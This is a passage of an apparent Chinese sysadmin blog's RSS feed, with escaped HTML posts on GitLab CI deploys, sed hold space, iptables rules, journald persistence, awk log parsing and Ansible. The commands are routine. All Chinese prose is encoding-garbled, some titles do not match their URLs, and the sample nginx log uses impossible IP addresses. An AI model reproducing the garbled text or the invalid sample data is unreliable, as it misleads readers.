&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;cnych/kustomize:v1.0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;echo $COMMIT_TIME&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;git config --global user.email &amp;#34;gitlab@git.k8s.local&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;git config --global user.name &amp;#34;GitLab CI/CD&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;git clone git://172.18.31.50:30000/test-k8s.git&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;cd test-k8s/prod&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;kustomize edit set image $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;cat kustomization.yaml&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;git commit -am &amp;#39;PROD image update&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;git push origin master&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;dependencies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;Build&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;yunwei&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;only&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;master&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;when&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;manual&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…ˆä¸ç€æ€¥çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œå†æ™®åŠä¸€ä¸‹ gitlab çš„è¿è¡Œæœºåˆ¶ï¼Œå®ƒæ˜¯é€šè¿‡ gitlab-runner æ¥æ‰§è¡Œcdçš„è¿‡ç¨‹çš„ã€‚é…ç½®gitlab runnerå…¶å®ä¹Ÿæ˜¯ä¸€é¡¹éå¸¸å¤æ‚çš„å·¥ä½œï¼Œé‡Œé¢å¯ä»¥é…çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œä¸æ˜¯æœ¬ç¯‡çš„èŒƒç•´ã€‚æˆ‘ä»¬è¿™é‡Œç®€å•æ¥è¯´ï¼Œrunnerå°±æ˜¯ä¸€ä¸ªDockerå®¹å™¨ã€‚æ›´å‡†ç¡®çš„è¯´ï¼Œå°±æ˜¯Docker in Dockerã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>sedçš„è¿›é˜¶ç”¨æ³•</title>
      <link>https://rendoumi.com/posts/20221024-sed_advanced/</link>
      <pubDate>Mon, 24 Oct 2022 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221024-sed_advanced/</guid>
      <description>&lt;p&gt;sed å’Œ awk ä»¥åŠ cut ç®—æ˜¯å¸¸ç”¨å·¥å…·äº†ï¼Œsedçš„é«˜çº§ç”¨æ³•ä¹Ÿéœ€è¦çŸ¥é“ä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;sed é‡Œé¢æœ‰2ä¸ªç©ºé—´ï¼Œä¸€ä¸ªæ˜¯pattern spaceï¼Œä¸€ä¸ªæ˜¯hold spaceï¼Œé»˜è®¤éƒ½æ˜¯ç©ºçš„&lt;/p&gt;
&lt;p&gt;å¼€å§‹å¤„ç†çš„æ—¶å€™ï¼Œå°±ä»æ–‡ä»¶é‡Œä¸€è¡Œä¸€è¡Œè¯»å…¥ pattern space ï¼Œè¿›è¡Œå¤„ç†ï¼Œhold space åªåœ¨ä½ éœ€è¦ç”¨åˆ°å®ƒçš„æ—¶å€™æ‰ä¼šå‡ºç°ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;d ï¼š æ¸…ç©ºpattern spaceä¸­çš„å†…å®¹ï¼Œç«‹å³å¼€å§‹ä¸‹ä¸ªå¾ªç¯(æ„æ€æ˜¯è·³è¿‡é»˜è®¤çš„è¾“å‡ºpattern spaceå†…å®¹çš„é˜¶æ®µï¼Ÿï¼Ÿï¼Ÿä¸çŸ¥ç†è§£çš„å¯¹ä¸å¯¹)
h ï¼š ç”¨pattern spaceä¸­çš„å†…å®¹æ›¿æ¢hold patternä¸­çš„å†…å®¹
H ï¼š åœ¨hold spaceä¸­çš„å†…å®¹åé¢è¿½åŠ ä¸€ä¸ªæ¢è¡Œï¼ŒæŠŠpattern spaceä¸­çš„å†…å®¹è¿½åŠ åˆ°hold spaceä¸­
g ï¼š ç”¨hold spaceä¸­çš„å†…å®¹æ›¿æ¢pattern spaceä¸­çš„å†…å®¹
G ï¼š åœ¨pattern spaceä¸­çš„å†…å®¹åé¢è¿½åŠ ä¸€ä¸ªæ¢è¡Œï¼ŒæŠŠhold spaceä¸­çš„å†…å®¹è¿½åŠ åˆ°pattern spaceä¸­

h, gä¼šæ›¿æ¢ï¼ˆå¯ä»¥ç†è§£ä¸ºå…ˆæ¸…ç©ºï¼Œå†å¤åˆ¶ï¼‰, H, Gæ˜¯è¿½åŠ ã€‚
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hHæ˜¯æ”¾è¿‡å»ï¼ŒgGæ˜¯æ‹¿è¿‡æ¥ï¼Œå°å†™æ˜¯æ›¿æ¢ï¼Œå¤§å†™æ˜¯è¿½åŠ &lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;1666593244877&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221024-sed_advanced/1666593244877.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ†æä¸€ä¸‹ç»å…¸çš„å°†æ–‡ä»¶å†…å®¹åå‘æ‰“å°&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cat 1.txt
1
2
3

cat 1.txt | sed -n &amp;#39;1!G;h;$p&amp;#39;
3
2
1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&amp;lsquo;1!G;h;$p&amp;rsquo; åˆ†æä¸€ä¸‹ï¼Œ1!Gå°±æ˜¯è¯´ç¬¬ä¸€è¡Œä¸æ‰§è¡ŒGï¼Œä»ç¬¬äºŒè¡Œå¼€å§‹æ‰§è¡ŒGï¼›ç„¶åhæ˜¯æ¯è¡Œéƒ½æ‰§è¡Œï¼Œæœ€åä¸€è¡Œçš„æ—¶å€™æ‰§è¡Œp&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;input | pattern |  hold   | command | pattern | hold | command | pattern | hold
1     | 1       |  ç©ºè¡Œ    |         | 1       | ç©ºè¡Œ |  h      | 1       | 1
2     | 2       |  1      | G       | 21      | 1    |  h      | 21      | 21
3     | 3       |  21     | G       | 321     | 21   |  h      | 321     | 321
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;1666595506589&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221024-sed_advanced/1666595506589.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>iptablesçš„åŸºæœ¬ç”¨æ³•</title>
      <link>https://rendoumi.com/posts/20221024-iptables/</link>
      <pubDate>Mon, 24 Oct 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221024-iptables/</guid>
      <description>&lt;p&gt;é¢è¯•çš„æ—¶å€™ç»å¸¸ä¼šè¢«é—®åˆ° iptables çš„é—®é¢˜ï¼Œé‚£ä¹ˆä¸‹é¢å°±è¿ç»´è§’åº¦æ¥æ€»ç»“ä¸€ä¸‹åŸºæœ¬çš„ç”¨æ³•ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;1666582967919&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221024-iptables/1666582967919.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;çœ‹æ™•äº†å§ï¼Œä¸è¦ç´§ï¼Œæˆ‘ä»¬å…³æ³¨ä¸Šé¢çš„5ä¸ªçº¢è‰²ï¼Œ5ä¸ªé“¾æ¡ï¼Œç„¶åç»§ç»­çœ‹ä¸‹é¢çš„è¡¨ï¼Œè¯¦ç»†è§£é‡Šäº†ä¸Šé¢çš„æµç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;img&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221024-iptables/image-20220719121029628.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸¤å¼ å›¾ç»“åˆèµ·æ¥çœ‹ï¼Œæ„æ€å°±æ˜¯æ•´ä¸ª iptables å¯ä»¥åŠ¨æ‰‹çš„åœ°æ–¹å¤ªå¤šäº†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å®Œå…¨æ²¡å¿…è¦å…³æ³¨é‚£ä¹ˆå¤šçš„ç»†èŠ‚ï¼Œå¸¸ç”¨çš„åœ°æ–¹å°±2ä¸ªï¼š&lt;/p&gt;
&lt;h4 id=&#34;ä¸€æœ€åçš„å‡ºå£nat-postrouting&#34;&gt;ä¸€ã€æœ€åçš„å‡ºå£nat postrouting&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;iptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šé¢æ˜¯åš openvpn æ—¶å¸¸ç”¨çš„ï¼Œä¸€å®šè®°å¾—ä¸è¦ä¹±ç”¨ MASQUERADEï¼Œè€Œè¦æŒ‡å®š ç‰¹å®šç½‘æ®µï¼ˆ10.11.0.0/16ï¼‰ ä» ç‰¹å®šIPï¼ˆ172.16.8.1ï¼‰ å‡ºå»ã€‚&lt;/p&gt;
&lt;h4 id=&#34;äºŒfilterè¡¨&#34;&gt;äºŒã€filterè¡¨&lt;/h4&gt;
&lt;p&gt;filterè¡¨æ˜¯ iptables ç¼ºçœä¸å¸¦å‚æ•°æŸ¥çœ‹çš„è¡¨ï¼Œç”¨äºè¿‡æ»¤æ•°æ®åŒ…ï¼Œè¿™æ˜¯æˆ‘ä»¬æ“ä½œçš„æœ€å¤šçš„åœ°æ–¹&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;iptables -I INPUT -s 185.207.178.236/32 -p tcp --dport 12530 -j ACCEPT
iptables -A INPUT -p tcp --dport 12530 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šé¢å°±åªå¼€æ”¾äº†ä¸€ä¸ªIP 185.207.178.236å¯ä»¥è®¿é—®æœ¬æœºçš„12530ç«¯å£ï¼Œå…¶ä½™çš„ç»Ÿç»Ÿå°æ‰ï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„è„šæœ¬äº†ã€‚&lt;/p&gt;
&lt;p&gt;OKï¼Œä»¥ä¸Šä¸¤ç‚¹æ˜¯æœ€å¸¸ç”¨çš„ã€‚å…¶ä½™çš„ç«¯å£è½¬å‘ä¹‹ç±»çš„ï¼Œæœ€å¥½ä¸­é—´ç”¨haproxyå’Œnginxè¿›è¡Œä»£ç†ï¼Œå¦åˆ™æŸ¥çœ‹ iptables ç³»ç»Ÿçš„æ¶æ„å°±å˜å¾—ä¸æ¸…æ™°äº†ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢è´´ä¸Šå¸¸ç”¨çš„å‚æ•°ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-p tcp/udp/icmp/all	        åŒ¹é…åè®®ï¼Œallä¼šåŒ¹é…æ‰€æœ‰åè®®
-s addr[/mask]	            åŒ¹é…æºåœ°å€
-d addr[/mask]              åŒ¹é…ç›®æ ‡åœ°å€	
--sport	                    åŒ¹é…æºç«¯å£ï¼ˆå¯æŒ‡å®šè¿ç»­çš„ç«¯å£ï¼‰å¦‚--sport80
--dport	                    åŒ¹é…ç›®çš„ç«¯å£ï¼ˆå¯æŒ‡å®šè¿ç»­çš„ç«¯å£ï¼‰å¦‚--dport80
-o interface	            åŒ¹é…å‡ºå£ç½‘å¡ï¼Œåªé€‚ç”¨äºFORWARDã€POSTROUTINGã€OUTPUTï¼ˆä¾‹ï¼šiptables -A FORWARD -o eth0ï¼‰
-i interface	            åŒ¹é…å…¥å£ç½‘å¡ï¼Œåªé€‚ç”¨äºPREROUTINGã€INPUTã€FORWARD
--icmp-type	                åŒ¹é…icmpç±»å‹ï¼ˆä½¿ç”¨iptables -p icmp -hå¯æŸ¥çœ‹å¯ç”¨çš„icmpç±»å‹ï¼‰
--tcp-flags mask comp	    åŒ¹é…TCPæ ‡è®°ï¼Œmaskè¡¨ç¤ºæ£€æŸ¥èŒƒå›´ï¼Œcompè¡¨ç¤ºåŒ¹é…maskä¸­çš„å“ªäº›æ ‡è®°ï¼ˆä¾‹ï¼šiptables -A FORWARD -p tcp --tcp-flags ALL SYN,ACK -j ACCEPT è¡¨ç¤ºåŒ¹é…SYNå’ŒACKæ ‡è®°çš„æ•°æ®åŒ…ï¼‰
-j DROP/ACCEPT/REJECT/LOG	æ‹’ç»/å…è®¸/æ‹’ç»å¹¶å‘å‡ºæ¶ˆæ¯/åœ¨/var/log/messagesä¸­ç™»è®°åˆ†ç»„åŒ¹é…çš„è®°å½•
-m mac -mac	ç»‘å®šMACåœ°å€
-m limit -limit 1/s 1/m	    è®¾ç½®æ—¶é—´ç­–ç•¥
-s 192.168.1.153æˆ–192.168.1.0/24	æŒ‡å®šæºåœ°å€æˆ–åœ°å€æ®µ
-d 192.168.1.153æˆ–192.168.1.0/24	æŒ‡å®šç›®æ ‡åœ°å€æˆ–åœ°å€æ®µ
-s ! 192.168.1.0	æŒ‡å®šæºåœ°å€ä»¥å¤–çš„
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åŸºæœ¬çš„2ä¸ªç”¨æ³•è¶³å¤Ÿæ»¡è¶³æ—¥å¸¸è¿ç»´çš„éœ€è¦äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>systemdä¸journalctlçš„åŒå‰‘åˆç’§</title>
      <link>https://rendoumi.com/posts/20220925-awk_usage/</link>
      <pubDate>Wed, 19 Oct 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220925-awk_usage/</guid>
      <description>&lt;p&gt;æ—¶ä»£å·²ç»è¿›åŒ–åˆ° systemd çš„å¹´ä»£äº†ï¼Œservice åº”è¯¥æ˜¯å½»åº•æ²¡æœ‰å¸‚åœºäº†&lt;/p&gt;
&lt;p&gt;systemd çš„å¥½å¤„æ˜¯å†™ç¨‹åºçš„æ—¶å€™å†ä¹Ÿä¸ç”¨ fork ç”©è„±çˆ¶è¿›ç¨‹äº†ï¼Œæ—¥å¿—ç›´æ¥è¾“å‡ºç»ˆç«¯å³å¯&lt;/p&gt;
&lt;p&gt;å¯¹ java æ¥è¯´ä¹Ÿæ˜¯ä¸ªå¥½äº‹ï¼Œæ‰€æœ‰çš„æ—¥å¿—æ¯”å¦‚WARN ERROR INFOéƒ½å¯ä»¥äº¤ç»™journalæ¥ç®¡ç†ï¼Œè¿™æ ·è¦æŸ¥æ‰¾æ—¥å¿—ä¹Ÿéå¸¸æ–¹ä¾¿äº†ã€‚&lt;/p&gt;
&lt;p&gt;ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬è¦æŠŠä¸€ä¸ªjavaå¯åŠ¨çš„ç¨‹åºåšæˆ systemd çš„ï¼š&lt;/p&gt;
&lt;p&gt;vim /etc/systemd/system/circle.service&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Unit]
After=network.target
Wants=network.target

[Service]
WorkingDirectory=/export/prod/server
Type=simple
ExecStart=/usr/bin/java -jar  -Dspring.config.location=application.properties -Dlog4j2.formatMsgNoLookups=true server.jar
Restart=on-failure
RestartSec=1s

[Install]
WantedBy=multi-user.target
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç„¶åå°±å¯ä»¥è¿è¡Œäº†ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;systemctl daemon-reload
systemctl start circle
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢çš„WorkingDirectoryï¼Œå› ä¸ºä¸‹é¢javaå¯åŠ¨æŒ‡å®š application.properties é…ç½®æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰ç”¨ç»å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆè¿™é‡Œå°±è¦æŒ‡å®šå½“å‰å·¥ä½œç›®å½•äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¦å¤–RestartSec=1sä¹Ÿæ”¹äº†ï¼Œç¼ºçœæ˜¯10msï¼Œå¤ªå¿«äº†&lt;/p&gt;
&lt;p&gt;å½“ç„¶è¿™åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œæ—¥å¿—æ˜¯å½’journalç®¡äº†ï¼Œjournalè¿˜æ˜¯éœ€è¦è¿›ä¸€æ­¥é…ç½®çš„&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå¿…é¡»è¦æŒä¹…åŒ–å­˜å‚¨åˆ°ç£ç›˜ï¼Œå¦åˆ™åªä¼šåœ¨/run/log/journalå†…å­˜ä¸­å­˜æ”¾ï¼Œé‡å¯å°±æ²¡äº†&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#disk-usageæŸ¥çœ‹çš„æ˜¯: å†…å­˜+/var/log/journalçš„åŠ èµ·æ¥çš„æ€»å’Œå¤§å°
journalctl --disk-usage
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç„¶åæˆ‘ä»¬éœ€è¦ä¿®æ”¹é…ç½®ï¼Œè®©å®ƒæŒä¹…åŒ–&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vi /etc/systemd/journald.conf
Storage=persistent
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¿®æ”¹é‡å¯&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkdir /var/log/journal
systemd-tmpfiles --create --prefix /var/log/journal
systemctl restart systemd-journald
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æœ€ååˆ·ä¸€ä¸‹ï¼ŒæŠŠå†…å­˜çš„æ–‡ä»¶åˆ·åˆ°ç£ç›˜ä¸­&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;journalctl --flush
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿˜å¯ä»¥è®¾ç½®ä¿å­˜å¤©æ•°ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;journalctl --vacuum-time=31d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æŸ¥çœ‹æ˜¯ä»é‚£ä¸€å¤©å¼€å§‹ä¿å­˜çš„ï¼Œè¿›ç›®å½•æŸ¥çœ‹æ—¶é—´æˆ³å³å¯&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd /var/log/journal
ls -lha 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æœ€åå°±æ˜¯ä¸€ä¸ªç§˜ç±äº†ï¼Œå¦‚æœæŠŠæ—¥å¿—å¼„å‡ºæ¥æŸ¥çœ‹&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;journalctl -u circle --since &amp;#34;2022-10-19 14:30:00&amp;#34; --until &amp;#34;2022-10-19 15:00:00&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¼€å‘äººå‘˜ç»å¸¸é—®æˆ‘è¦æ—¥å¿—ï¼Œè¿™æ ·å°±ç‰¹åˆ«æ–¹ä¾¿å¿«æ·äº†ï¼Œæ¯”ä»log4jçš„æ—¥å¿—ç›®å½•é‡Œæ‹‰æ–¹ä¾¿çš„å¤šã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>awkçš„ç”¨æ³•</title>
      <link>https://rendoumi.com/posts/20221019-systemctl/</link>
      <pubDate>Sun, 25 Sep 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221019-systemctl/</guid>
      <description>&lt;p&gt;awk æ˜¯æ¯”è¾ƒå¼ºåŠ›çš„å·¥å…·ï¼Œè·Ÿcutå’Œsedç»„åˆèµ·æ¥ï¼Œä¼šæœ‰æ„æƒ³ä¸åˆ°çš„ä½œç”¨&lt;/p&gt;
&lt;p&gt;ä¸¾ä¸ªç®€å•ä¾‹å­ï¼Œæˆ‘ä»¬nginxçš„access.logå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;110.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net &amp;#34;GET /user/article/248 HTTP/1.1&amp;#34; 200 10616 &amp;#34;http://my.jjwxc.net/&amp;#34;
220.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net &amp;#34;GET /user/article/248 HTTP/1.1&amp;#34; 200 20616 &amp;#34;http://my.jjwxc.net/&amp;#34;
330.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net &amp;#34;GET /user/article/248 HTTP/1.1&amp;#34; 200 30616 &amp;#34;http://my.jjwxc.net/&amp;#34;
410.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net &amp;#34;GET /user/article/248 HTTP/1.1&amp;#34; 200 10616 &amp;#34;http://my.jjwxc.net/&amp;#34;
530.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net &amp;#34;GET /user/article/248 HTTP/1.1&amp;#34; 200 10616 &amp;#34;http://my.jjwxc.net/&amp;#34;
650.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net &amp;#34;GET /user/article/248 HTTP/1.1&amp;#34; 200 50616 &amp;#34;http://my.jjwxc.net/&amp;#34;
760.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net &amp;#34;GET /user/article/248 HTTP/1.1&amp;#34; 200 60616 &amp;#34;http://my.jjwxc.net/&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯ipï¼Œç„¶åå€’æ•°ç¬¬3ä¸ªæ˜¯200ï¼Œè¡¨ç¤º200 OKï¼Œåé¢çš„å°±æ˜¯ä¼ è¾“äº†å¤šå°‘æ•°æ®ä¸¤ç»™å®¢æˆ·ç«¯
æˆ‘ä»¬è¦ç»Ÿè®¡ä¸€ä¸‹æµé‡å¤§çš„å‰5åæ˜¯è°ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ansibleä¹‹ç­‰å¾…æœåŠ¡çŠ¶æ€å˜æˆæˆåŠŸ</title>
      <link>https://rendoumi.com/posts/20220729-ansible_until/</link>
      <pubDate>Fri, 29 Jul 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220729-ansible_until/</guid>
      <description>&lt;p&gt;ansibleçš„è„šæœ¬ä¸­æˆ‘ä»¬å¯èƒ½ä¼šè¦å¯åŠ¨æŸé¡¹æœåŠ¡å¹¶ç­‰å¾…ï¼Œç›´åˆ°æœåŠ¡å¯åŠ¨èµ·æ¥ï¼Œç„¶åå†è¿›è¡Œä¸‹ä¸€æ­¥&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªéå¸¸é‡è¦ï¼Œæˆ‘ä»¬ä¸¾ä¾‹æ¥å®éªŒä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- hosts: localhost
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  vars:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    local__service: ssh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  tasks:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    - block:
